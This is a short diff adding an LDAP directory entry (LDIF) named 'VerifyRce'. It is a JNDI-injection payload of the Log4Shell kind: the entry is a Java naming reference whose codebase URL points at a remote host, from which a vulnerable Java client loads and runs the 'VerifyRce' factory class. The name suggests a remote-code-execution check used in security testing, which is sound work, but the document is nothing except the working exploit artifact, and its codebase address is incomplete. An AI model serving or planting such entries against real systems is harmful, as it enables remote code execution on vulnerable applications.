@@ -1,0 +1,8 @@
+dn: cn=VerifyRce,dc=nodomain
+objectClass: top
+objectClass: javaContainer
+objectClass: javaNamingReference
+cn: VerifyRce
+javaClassName: VerifyRce
+javaCodeBase: http://192.168.100
+javaFactory: VerifyRce
